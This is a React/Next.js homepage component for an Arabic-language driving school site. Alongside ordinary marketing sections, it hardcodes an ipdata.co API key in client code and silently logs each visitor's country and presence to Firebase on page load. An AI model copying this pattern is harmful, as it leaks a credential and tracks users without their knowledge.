"use client"

import Image from "next/image"
import {
  ArrowLeft,
  Award,
  Book,
  Calendar,
  CheckCircle,
  Clock,
  FileText,
  GraduationCap,
  MapPin,
  Phone,
  Users,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { useEffect, useState } from "react"
import { FullPageLoader } from "@/components/load"

const visitorId = `sc-app-${Math.random().toString(36).substring(2, 15)}`

export default function Home() {
  const [loading,setLoading]=useState(true)
  const locationLog = async () => {
    if (!visitorId) return

    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) throw new Error(`HTTP error! ${response.status}`)
      const country = await response.text()

      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country,
        action: "page_load",
        currentPage: "الرئيسية",
      })

      localStorage.setItem("country", country)
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error",
      })
    }
  }

  useEffect(() => {
    locationLog().then(()=>{
      setLoading(false)
    })
  }, [])

  const handleRedirect = (page: string) => {
    window.location.href = `/${page}`
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {loading&&<FullPageLoader/>/* Hero Section */}

      <section className="relative h-[400px] md:h-[550px] overflow-hidden">
        <video autoPlay muted loop playsInline className="absolute inset-0 w-full h-full object-cover">
          <source src="/vid.mp4" type="video/mp4" />
        </video>

        <div className="absolute inset-0 bg-gradient-to-l from-black/70 via-black/40 to-transparent"></div>
        <div className="absolute inset-0 flex items-center">
          <div className="container mx-auto px-6">
            <div className="max-w-2xl animate-fadeIn">
              <h1 className="text-white text-3xl md:text-5xl font-extrabold mb-4 leading-tight">
                أتقن القيادة مع التدريب المهني
              </h1>
              <p className="text-white/90 text-lg md:text-xl mb-6 leading-relaxed">
                انضم إلى آلاف الخريجين الذين تعلموا القيادة بأمان وثقة مع مدربينا الخبراء
              </p>
              <div className="flex flex-col sm:flex-row gap-4">
                <Button
                  size="lg"
                  onClick={() => handleRedirect("courses")}
                  className="bg-green-700 hover:bg-green-600 text-white font-medium flex items-center justify-center gap-2 shadow-md transition-all hover:scale-105"
                >
                  <ArrowLeft className="h-5 w-5" />
                  ابدأ رحلتك
                </Button>
                <Button
                  size="lg"
                  onClick={() => handleRedirect("about")}
                  variant="outline"
                  className="border-white/40 bg-white/10 text-white hover:bg-white/20 transition-all hover:scale-105 flex items-center justify-center gap-2"
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="h-5 w-5"
                  >
                    <polygon points="5,3 19,12 5,21" />
                  </svg>
                  شاهد قصتنا
                </Button>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Logo Section */}
      <section className="bg-white py-10 text-center animate-fadeInUp">
        <div className="inline-block bg-green-100 rounded-full p-6 mb-4 shadow-inner">
          <div className="bg-white rounded-full p-4 shadow-md">
            <Image src="/site-logo.png" alt="شعار المدرسة" width={80} height={80} />
          </div>
        </div>
        <h2 className="text-2xl font-bold text-green-800">مدرسة التميز لتعليم القيادة</h2>
      </section>

      {/* Stats Section */}
      <section className="py-12 bg-gray-50 animate-fadeIn">
        <div className="container mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-6 text-center">
          {[
            { icon: GraduationCap, label: "خريج", value: "+٣٠٠ ألف" },
            { icon: Award, label: "ساعة ميدانية", value: "+٢٣٠ ألف" },
            { icon: Clock, label: "ساعة تدريب", value: "+١٠٠ ألف" },
            { icon: Users, label: "مدرب ومدربة", value: "+٣٠٠" },
          ].map((item, i) => (
            <div
              key={i}
              className="bg-white rounded-xl shadow hover:shadow-lg transition-all duration-300 p-6 flex flex-col items-center"
            >
              <item.icon className="h-8 w-8 text-green-700 mb-2" />
              <h3 className="text-xl md:text-2xl font-bold text-gray-800">{item.value}</h3>
              <p className="text-sm text-gray-600">{item.label}</p>
            </div>
          ))}
        </div>
      </section>

      {/* Features Section */}
      <section className="py-12 bg-white">
        <div className="container mx-auto px-6">
          <h2 className="text-2xl font-bold text-center mb-10 text-green-800">برامج تدريبية شاملة</h2>
          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
            {[
              { icon: Book, title: "التدريب النظري", text: "جلسات تغطي قوانين المرور وبروتوكولات السلامة" },
              { icon: MapPin, title: "التدريب العملي", text: "خبرة قيادة عملية مع مدربين محترفين" },
              { icon: FileText, title: "التحضير للامتحان", text: "تدريب لمساعدتك على اجتياز الامتحانات" },
              { icon: Calendar, title: "جدولة مرنة", text: "اختر أوقات التدريب التي تناسبك" },
              { icon: CheckCircle, title: "مدربون معتمدون", text: "تعلم من محترفين ذوي خبرة" },
              { icon: Phone, title: "دعم ٢٤/٧", text: "فريق الدعم جاهز للإجابة في أي وقت" },
            ].map((item, i) => (
              <div
                key={i}
                className="bg-gray-50 p-5 rounded-lg shadow-sm hover:shadow-md transition-all duration-300 flex gap-4 items-start hover:-translate-y-1"
              >
                <div className="bg-green-100 p-3 rounded-lg">
                  <item.icon className="h-6 w-6 text-green-700" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900 mb-1">{item.title}</h3>
                  <p className="text-sm text-gray-600">{item.text}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-14 bg-green-800 text-white text-center">
        <div className="container mx-auto px-6 animate-fadeInUp">
          <h2 className="text-2xl md:text-3xl font-bold mb-4">هل أنت مستعد لبدء رحلة القيادة؟</h2>
          <p className="mb-6 text-white/90 max-w-xl mx-auto leading-relaxed">
            انضم إلى آلاف الطلاب الذين حصلوا على رخصة القيادة معنا بكل ثقة واحترافية
          </p>
          <Button
            onClick={() => handleRedirect("courses")}
            className="bg-white text-green-800 hover:bg-gray-100 px-6 py-3 rounded-full font-semibold shadow-md transition-all hover:scale-105"
          >
            <ArrowLeft className="mr-2 h-4 w-4" /> سجل الآن
          </Button>
        </div>
      </section>
    </div>
  )
}
